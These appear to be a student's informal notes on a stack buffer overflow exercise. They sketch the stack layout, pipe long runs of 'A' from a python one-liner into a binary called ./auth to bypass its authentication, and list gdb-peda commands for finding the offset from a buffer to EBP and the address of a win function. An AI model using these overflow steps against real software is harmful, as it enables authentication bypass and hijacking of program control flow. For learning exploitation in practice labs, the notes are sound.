First just run the program

stack :

	EBP
	a
	Buf

we cant overrite anything below. Always LOW --> HIGH


python3 -c 'print("A"*100)'
>> python will execute the code like C does.

python3 -c 'print("A"*69)' | ./auth
>> 69 because buffer size

python3 -c 'print("A"*100)' | ./auth)
>> now I will be authenticated becasue of buffer overflow


------------------

>> gdb win_me
gdb_peda>> disas vuln
		>> b *(address where we want to break)
		>> r
		[from there we can see the adress of EBP] / >> p $ebp [another way to know the 	address of ebp]
		>> p &buf [to know the address of buffer]
		>> p/d higherAddress-lowerAddress
		>> p win
		[endian format -> little endians and big endians]
